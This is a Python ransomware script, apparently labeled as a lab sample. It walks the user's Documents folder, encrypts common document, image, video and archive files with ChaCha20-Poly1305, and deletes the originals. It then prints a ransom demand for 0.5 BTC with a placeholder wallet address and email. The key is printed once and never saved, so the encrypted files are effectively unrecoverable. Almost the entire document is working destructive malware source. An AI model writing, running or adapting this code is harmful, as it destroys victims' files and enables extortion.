import os
import glob
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import secrets

# === CONFIGURATION ===
KEY = secrets.token_bytes(32)  # 256-bit key, generated once per run
RANSOM_EXT = ".cha20lock"
SKIP = {
 "desktop.ini", "Thumbs.db"
}
# Optional: comment out the line below to encrypt EVERY file
TARGET_EXTENSIONS = {".txt",".bmp",".pdf", ".doc", ".docx", ".xls", ".xlsx", ".jpg", ".png", ".mp4",".csv", ".zip", ".ai", ".rar"}

def encrypt_file(filepath):
 try:
 with open(filepath, "rb") as f:
 plaintext = f.read()
 if not plaintext:
 return  # skip empty files
 # === CORE ENCRYPTION BLOCK ===
 chacha = ChaCha20Poly1305(KEY)
 nonce = secrets.token_bytes(12)  # 96-bit nonce for ChaCha20-Poly1305
 ciphertext = chacha.encrypt(nonce, plaintext, None)  # no AAD
 encrypted_path = filepath + RANSOM_EXT
 with open(encrypted_path, "wb") as f:
 f.write(nonce)  # nonce is public, needed for decryption
 f.write(ciphertext)
 os.remove(filepath)
 print(f"[+] {filepath} → {encrypted_path}")
 except Exception as e:
 print(f"[-] Failed {filepath}: {e}")

def main():
 target_dir = os.path.join(os.path.expanduser("~"), "Documents")
 os.chdir(target_dir)
 print(f"[*] Ransomware activated in: {target_dir}")
 print(f"[*] Encryption key (for lab analysis only): {KEY.hex()}\n")
 count = 0
 for root, dirs, files in os.walk("."):
 for file in files:
 filepath = os.path.join(root, file)
 if not os.path.isfile(filepath):
 continue
 filename = os.path.basename(filepath)
 if filename.endswith(RANSOM_EXT):
 continue
 _, ext = os.path.splitext(filename)
 if TARGET_EXTENSIONS and ext.lower() not in TARGET_EXTENSIONS:
 continue
 encrypt_file(filepath)
 count += 1
 print(f"\n[!] ALL YOUR FILES ARE ENCRYPTED")
 print(f"[!] {count} files locked with extension {RANSOM_EXT}")
 print("[!] To decrypt, send 0.5 BTC to 1Cha20Lockxxxxxxxxxxxxxxxxxxxxxxxxxx")
 print("[!] Then email your key to recover@locked.files with proof of payment\n")

if __name__ == "__main__":
 main()

